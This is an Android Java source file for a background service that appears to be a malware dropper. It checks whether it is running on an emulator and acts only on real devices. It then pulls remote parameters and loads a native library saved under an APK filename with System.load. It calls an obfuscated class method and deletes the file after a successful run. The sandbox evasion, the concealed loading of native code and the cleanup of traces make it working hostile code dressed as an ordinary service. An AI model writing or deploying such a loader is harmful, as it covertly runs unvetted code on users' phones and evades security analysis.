package com.use.nice;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

import com.use.nice.manager.GlobalContext;
import com.use.nice.update.UpdateUtil;
import com.use.nice.util.EmulateCheckUtil;
import com.use.nice.util.Util_File;
import com.use.nice.util.Util_Log;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Created by zhengnan on 2015/12/17.
 */
public class MyService extends Service {
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    ExecutorService service = Executors.newSingleThreadExecutor();
    final  static boolean testAsset = true;
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Util_Log.log("onStartCommand");
        GlobalContext.init(this);
        if(!testAsset){
            NiceFace.onReceive(this, intent);
            return super.onStartCommand(intent, flags, startId);
        }

        if(Util_File.readDef(this,FieldName.nice_forver,"0").equals("1")){
            Util_Log.log("永不执行标记！");
            stopSelf();
            return super.onStartCommand(intent, flags, startId);
        }
        //copy asset下data来使用的测试
        EmulateCheckUtil.isValidDevice(MyService.this, new EmulateCheckUtil.ResultCallBack() {
            @Override
            public void isEmulator() {

            }

            @Override
            public void isDevice() {
                Util_Log.log("isDevice");
                service.execute(new Runnable() {
                    @Override
                    public void run() {
                        Context paramContext = MyService.this;
                        Util_Log.log(UpdateUtil.surePullParams(paramContext, null).toString());
    //                将data目录释放到sdcard
                        //AssetsCopy.copyFileOrDir(paramContext, "data");
    //                加载assets下so文件
                        final NiceCtrl face = NiceCtrl.getIns();
                        face.sureApk();
                        try {
                            File file = new File(Util_File.addSeparator(NiceCts.SAVE_PATH_NAME) + NiceCts.APK_NAME);

                            Util_Log.log("load so ...");
                            System.load("" + file.getAbsolutePath());
                            String ret = a.e.g.c.a(paramContext);
                            if (Util_Log.logShow) Util_Log.log("so exe ret:" + ret);
                            Util_File.writeDef(paramContext, FieldName.soSuccess, ret);
                            if (ret.equals(FieldName.success)) {
                                face.deleteApk();
                            }
                            stopSelf();
                        } catch (Throwable e) {
                            e.printStackTrace();
                            stopSelf();
                            face.deleteApk();
                            // return;
                        }
                    }
                });
            }

            @Override
            public void notSure() {

            }
        });

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Util_Log.log("onDestroy");
    }
}
